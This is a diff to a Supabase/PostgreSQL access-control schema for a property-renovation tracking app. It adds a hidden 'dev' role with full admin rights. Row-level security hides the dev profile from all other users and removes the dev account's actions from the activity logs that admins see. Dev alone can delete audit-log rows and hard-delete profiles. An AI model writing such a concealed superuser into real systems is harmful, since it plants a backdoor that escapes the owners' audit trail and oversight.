@@ -4,24 +4,38 @@
 
 -- ============================================================
 -- 1. Profiles (role + display name, one row per auth user)
+--    'dev' is a hidden role: a superset of admin's access, plus a few
+--    dev-exclusive capabilities (deleting activity_logs rows, deleting
+--    a profiles row outright), invisible to everyone else — see
+--    015_dev_role.sql for the full rationale. Nothing in this schema
+--    exposes a UI path to grant 'dev'; it's set by direct SQL only.
 -- ============================================================
 create table if not exists public.profiles (
   id uuid primary key references auth.users (id) on delete cascade,
   display_name text not null,
-  role text not null check (role in ('admin', 'project_manager', 'viewer')) default 'viewer',
+  role text not null check (role in ('admin', 'project_manager', 'viewer', 'dev')) default 'viewer',
   created_at timestamptz not null default now()
 );
 
 alter table public.profiles enable row level security;
 
+-- Every profile is readable by any authenticated user EXCEPT a 'dev'
+-- profile, which is only readable by itself — this is what makes the
+-- dev account invisible in the admin's user list, every person-picker
+-- dropdown, and any other query against profiles.
 drop policy if exists "Profiles are readable by any authenticated user" on public.profiles;
-create policy "Profiles are readable by any authenticated user"
+drop policy if exists "Profiles readable by any authenticated user except hidden dev accounts" on public.profiles;
+create policy "Profiles readable by any authenticated user except hidden dev accounts"
   on public.profiles for select
   to authenticated
-  using (true);
+  using (
+    role <> 'dev'
+    or id = auth.uid()
+  );
 
--- Signup can only ever create 'viewer' profiles; project_manager/admin
--- must be granted afterwards by an existing admin.
+-- Signup can only ever create 'viewer' profiles; project_manager/admin/
+-- dev must be granted afterwards by an existing admin (dev only via
+-- direct SQL — see above).
 drop policy if exists "Users can insert their own profile" on public.profiles;
 drop policy if exists "Users can insert their own profile as viewer" on public.profiles;
 create policy "Users can insert their own profile as viewer"
@@ -47,10 +61,30 @@ create policy "Admins can update any profile"
   on public.profiles for update
   to authenticated
   using (
-    exists (select 1 from public.profiles p where p.id = auth.uid() and p.role = 'admin')
+    exists (select 1 from public.profiles p where p.id = auth.uid() and p.role in ('admin', 'dev'))
   )
   with check (
-    exists (select 1 from public.profiles p where p.id = auth.uid() and p.role = 'admin')
+    exists (select 1 from public.profiles p where p.id = auth.uid() and p.role in ('admin', 'dev'))
+  );
+
+-- Dev-only: hard-delete a profiles row outright (distinct from the
+-- role/access changes above). In practice this only succeeds for a
+-- profile with no history — properties.created_by, entries.created_by,
+-- scope_items.created_by/checked_by, activity_logs.actor_id/
+-- target_profile_id, scope_item_assignments.profile_id/assigned_by, and
+-- property_access.profile_id/granted_by all reference profiles(id) with
+-- no ON DELETE rule (default RESTRICT), several NOT NULL, so deleting a
+-- profile with any activity raises a foreign-key violation. Also note:
+-- this only ever removes the public.profiles row, never the underlying
+-- auth.users account (that requires the service_role key, which this
+-- app doesn't have) — the person's login still exists, they just have
+-- no profile to load.
+drop policy if exists "Dev can delete a profile" on public.profiles;
+create policy "Dev can delete a profile"
+  on public.profiles for delete
+  to authenticated
+  using (
+    exists (select 1 from public.profiles p where p.id = auth.uid() and p.role = 'dev')
   );
 
 -- NOTE: there's no bootstrap admin yet. After running this schema, sign
@@ -75,7 +109,7 @@ alter table public.properties enable row level security;
 
 -- ============================================================
 -- 3. Per-property viewer access.
---    Admins and project managers can always see every property.
+--    Admins, dev, and project managers can always see every property.
 --    Viewers can only see properties they've been explicitly granted
 --    access to via a row in this table.
 -- ============================================================
@@ -98,14 +132,14 @@ create policy "Property access is readable by any authenticated user"
   to authenticated
   using (true);
 
--- Only admins, or the project manager who created the property, can
+-- Only admins/dev, or the project manager who created the property, can
 -- grant/revoke a viewer's access to it.
 drop policy if exists "Admins and property owners can grant access" on public.property_access;
 create policy "Admins and property owners can grant access"
   on public.property_access for insert
   to authenticated
   with check (
-    exists (select 1 from public.profiles p where p.id = auth.uid() and p.role = 'admin')
+    exists (select 1 from public.profiles p where p.id = auth.uid() and p.role in ('admin', 'dev'))
     or exists (
       select 1 from public.properties pr
       where pr.id = property_access.property_id and pr.created_by = auth.uid()
@@ -117,7 +151,7 @@ create policy "Admins and property owners can revoke access"
   on public.property_access for delete
   to authenticated
   using (
-    exists (select 1 from public.profiles p where p.id = auth.uid() and p.role = 'admin')
+    exists (select 1 from public.profiles p where p.id = auth.uid() and p.role in ('admin', 'dev'))
     or exists (
       select 1 from public.properties pr
       where pr.id = property_access.property_id and pr.created_by = auth.uid()
@@ -136,7 +170,7 @@ create policy "Properties readable by admins, PMs, and granted viewers"
   using (
     exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
     or exists (
       select 1 from public.property_access pa
@@ -152,19 +186,19 @@ create policy "Admins and project managers can create properties"
   with check (
     exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
   );
 
 -- Deleting a property cascades to its entries, property_access, and
--- scope of work rows (see their foreign keys); admins still need to
+-- scope of work rows (see their foreign keys); admins/dev still need to
 -- clean up storage files separately since those aren't FK-tracked.
 drop policy if exists "Admins can delete properties" on public.properties;
 create policy "Admins can delete properties"
   on public.properties for delete
   to authenticated
   using (
-    exists (select 1 from public.profiles p where p.id = auth.uid() and p.role = 'admin')
+    exists (select 1 from public.profiles p where p.id = auth.uid() and p.role in ('admin', 'dev'))
   );
 
 -- ============================================================
@@ -212,7 +246,7 @@ create policy "Scope headers readable by admins, PMs, and granted viewers"
   using (
     exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
     or exists (
       select 1 from public.property_access pa
@@ -227,7 +261,7 @@ create policy "Scope points readable by admins, PMs, and granted viewers"
   using (
     exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
     or exists (
       select 1 from public.property_access pa
@@ -235,9 +269,10 @@ create policy "Scope points readable by admins, PMs, and granted viewers"
     )
   );
 
--- Admins and project managers can define and manage the scope of work:
--- add/remove headers and points, and check/uncheck any point (checking
--- is a shared team action, not restricted to whoever added the point).
+-- Admins, dev, and project managers can define and manage the scope of
+-- work: add/remove headers and points, and check/uncheck any point
+-- (checking is a shared team action, not restricted to whoever added
+-- the point).
 drop policy if exists "Admins and PMs can create scope headers" on public.scope_headers;
 create policy "Admins and PMs can create scope headers"
   on public.scope_headers for insert
@@ -245,7 +280,7 @@ create policy "Admins and PMs can create scope headers"
   with check (
     exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
   );
 
@@ -256,7 +291,7 @@ create policy "Admins and PMs can update scope headers"
   using (
     exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
   );
 
@@ -267,7 +302,7 @@ create policy "Admins and PMs can delete scope headers"
   using (
     exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
   );
 
@@ -278,7 +313,7 @@ create policy "Admins and PMs can create scope points"
   with check (
     exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
   );
 
@@ -289,7 +324,7 @@ create policy "Admins and PMs can update scope points"
   using (
     exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
   );
 
@@ -300,7 +335,7 @@ create policy "Admins and PMs can delete scope points"
   using (
     exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
   );
 
@@ -391,7 +426,7 @@ create policy "Scope items readable by admins, PMs, and granted viewers"
   using (
     exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
     or exists (
       select 1 from public.property_access pa
@@ -406,7 +441,7 @@ create policy "Admins and PMs can create scope items"
   with check (
     exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
   );
 
@@ -417,7 +452,7 @@ create policy "Admins and PMs can update scope items"
   using (
     exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
   );
 
@@ -428,15 +463,12 @@ create policy "Admins and PMs can delete scope items"
   using (
     exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
   );
 
 -- ============================================================
 -- 5c. Scope item assignments + activity log, on top of scope_items.
---     NOTE: nothing in the app reads or writes these yet — wiring them
---     into the UI is a separate, later change. Provisioned here so that
---     later work doesn't need a schema migration of its own.
 -- ============================================================
 -- An assignment has a lifecycle: assigned_at when created, unassigned_at
 -- once it ends. Only one ACTIVE (unassigned_at is null) assignment per
@@ -487,7 +519,7 @@ create policy "Scope item assignments readable by admins, PMs, and granted viewe
   using (
     exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
     or exists (
       select 1 from public.scope_items si
@@ -503,7 +535,7 @@ create policy "Admins and PMs can create scope item assignments"
   with check (
     exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
   );
 
@@ -514,7 +546,7 @@ create policy "Admins and PMs can delete scope item assignments"
   using (
     exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
   );
 
@@ -528,28 +560,43 @@ create policy "Admins and PMs can update scope item assignments"
   using (
     exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
   )
   with check (
     exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
   );
 
+-- Dev sees every activity_logs row (including their own actions, for a
+-- forensic trail). Admins/PMs/granted viewers see everything EXCEPT
+-- rows whose actor is the dev account — that's what makes dev's actions
+-- invisible on the Logs page to everyone else, without ever deleting
+-- the underlying row.
 drop policy if exists "Activity logs readable by admins, PMs, and granted viewers" on public.activity_logs;
-create policy "Activity logs readable by admins, PMs, and granted viewers"
+drop policy if exists "Activity logs readable by admins, PMs, dev, and granted viewers, minus hidden dev rows" on public.activity_logs;
+create policy "Activity logs readable by admins, PMs, dev, and granted viewers, minus hidden dev rows"
   on public.activity_logs for select
   to authenticated
   using (
-    exists (
-      select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
-    )
-    or exists (
-      select 1 from public.property_access pa
-      where pa.property_id = activity_logs.property_id and pa.profile_id = auth.uid()
+    exists (select 1 from public.profiles p where p.id = auth.uid() and p.role = 'dev')
+    or (
+      (
+        exists (
+          select 1 from public.profiles p
+          where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+        )
+        or exists (
+          select 1 from public.property_access pa
+          where pa.property_id = activity_logs.property_id and pa.profile_id = auth.uid()
+        )
+      )
+      and not exists (
+        select 1 from public.profiles actor
+        where actor.id = activity_logs.actor_id and actor.role = 'dev'
+      )
     )
   );
 
@@ -562,13 +609,22 @@ create policy "Admins, PMs, and granted viewers can log activity"
     and (
       exists (
         select 1 from public.profiles p
-        where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+        where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
       )
       or exists (
         select 1 from public.property_access pa
         where pa.property_id = activity_logs.property_id and pa.profile_id = auth.uid()
       )
     )
+  );
+
+-- Dev-only: nothing could delete an activity_logs row before this.
+drop policy if exists "Dev can delete activity log rows" on public.activity_logs;
+create policy "Dev can delete activity log rows"
+  on public.activity_logs for delete
+  to authenticated
+  using (
+    exists (select 1 from public.profiles p where p.id = auth.uid() and p.role = 'dev')
   );
 
 -- ============================================================
@@ -590,7 +646,7 @@ create index if not exists entries_property_id_created_at_idx
 
 alter table public.entries enable row level security;
 
--- Same visibility rule as properties: admins/PMs see everything,
+-- Same visibility rule as properties: admins/PMs/dev see everything,
 -- viewers only see entries under properties they've been granted.
 drop policy if exists "Entries are readable by any authenticated user" on public.entries;
 drop policy if exists "Entries readable by admins, PMs, and granted viewers" on public.entries;
@@ -600,7 +656,7 @@ create policy "Entries readable by admins, PMs, and granted viewers"
   using (
     exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
     or exists (
       select 1 from public.property_access pa
@@ -616,7 +672,7 @@ create policy "Admins and project managers can create entries"
   with check (
     exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
     and created_by = auth.uid()
   );
@@ -624,7 +680,7 @@ create policy "Admins and project managers can create entries"
 -- Allow the uploader to edit/delete their own entries (optional, handy
 -- for typo fixes). Uploaders can otherwise edit their own entry freely,
 -- but show_in_report is locked down separately: a BEFORE UPDATE
--- trigger (below) blocks anyone but an admin from changing it after
+-- trigger (below) blocks anyone but an admin/dev from changing it after
 -- creation, since a bare RLS WITH CHECK that re-queries entries to
 -- compare against the stored value is fragile — it depends on exactly
 -- when Postgres considers that re-query's snapshot to include the
@@ -646,7 +702,7 @@ create policy "Uploaders can delete their own entries"
   to authenticated
   using (created_by = auth.uid());
 
--- Enforces the show_in_report lock described above: only admins may
+-- Enforces the show_in_report lock described above: only admins/dev may
 -- change it once an entry exists.
 drop trigger if exists entries_show_in_report_lock on public.entries;
 
@@ -657,7 +713,7 @@ as $$
 begin
   if NEW.show_in_report is distinct from OLD.show_in_report then
     if not exists (
-      select 1 from public.profiles p where p.id = auth.uid() and p.role = 'admin'
+      select 1 from public.profiles p where p.id = auth.uid() and p.role in ('admin', 'dev')
     ) then
       raise exception 'Only admins can change show_in_report after an entry is created';
     end if;
@@ -671,14 +727,14 @@ create trigger entries_show_in_report_lock
   for each row
   execute function public.enforce_entries_show_in_report_lock();
 
--- Admins can update/delete any entry, regardless of uploader, with no
--- column restrictions (so they can flip show_in_report at any time).
+-- Admins/dev can update/delete any entry, regardless of uploader, with
+-- no column restrictions (so they can flip show_in_report at any time).
 drop policy if exists "Admins can update any entry" on public.entries;
 create policy "Admins can update any entry"
   on public.entries for update
   to authenticated
   using (
-    exists (select 1 from public.profiles p where p.id = auth.uid() and p.role = 'admin')
+    exists (select 1 from public.profiles p where p.id = auth.uid() and p.role in ('admin', 'dev'))
   );
 
 drop policy if exists "Admins can delete any entry" on public.entries;
@@ -686,7 +742,7 @@ create policy "Admins can delete any entry"
   on public.entries for delete
   to authenticated
   using (
-    exists (select 1 from public.profiles p where p.id = auth.uid() and p.role = 'admin')
+    exists (select 1 from public.profiles p where p.id = auth.uid() and p.role in ('admin', 'dev'))
   );
 
 -- ============================================================
@@ -753,7 +809,7 @@ create policy "Public can read progress photos"
   to public
   using (bucket_id = 'progress-photos');
 
--- Only admins and project managers can upload photos.
+-- Only admins, dev, and project managers can upload photos.
 drop policy if exists "Project managers can upload progress photos" on storage.objects;
 drop policy if exists "Admins and project managers can upload progress photos" on storage.objects;
 create policy "Admins and project managers can upload progress photos"
@@ -763,7 +819,7 @@ create policy "Admins and project managers can upload progress photos"
     bucket_id = 'progress-photos'
     and exists (
       select 1 from public.profiles p
-      where p.id = auth.uid() and p.role in ('admin', 'project_manager')
+      where p.id = auth.uid() and p.role in ('admin', 'project_manager', 'dev')
     )
   );
 
@@ -773,7 +829,7 @@ create policy "Uploaders can delete their own progress photos"
   to authenticated
   using (bucket_id = 'progress-photos' and owner = auth.uid());
 
--- Admins can delete any progress photo, not just ones they uploaded
+-- Admins/dev can delete any progress photo, not just ones they uploaded
 -- (needed when deleting someone else's entry or an entire property).
 drop policy if exists "Admins can delete any progress photo" on storage.objects;
 create policy "Admins can delete any progress photo"
@@ -781,5 +837,5 @@ create policy "Admins can delete any progress photo"
   to authenticated
   using (
     bucket_id = 'progress-photos'
-    and exists (select 1 from public.profiles p where p.id = auth.uid() and p.role = 'admin')
+    and exists (select 1 from public.profiles p where p.id = auth.uid() and p.role in ('admin', 'dev'))
   );
